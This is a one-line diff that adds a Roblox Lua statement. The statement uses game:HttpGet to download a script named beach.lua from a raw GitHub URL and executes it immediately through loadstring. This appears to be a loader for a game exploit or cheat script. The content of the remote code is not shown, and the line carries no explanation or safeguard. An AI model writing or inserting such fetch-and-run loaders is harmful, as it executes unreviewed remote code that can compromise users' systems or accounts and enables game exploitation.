@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/serpentesz/scripts/main/beach.lua",true))()
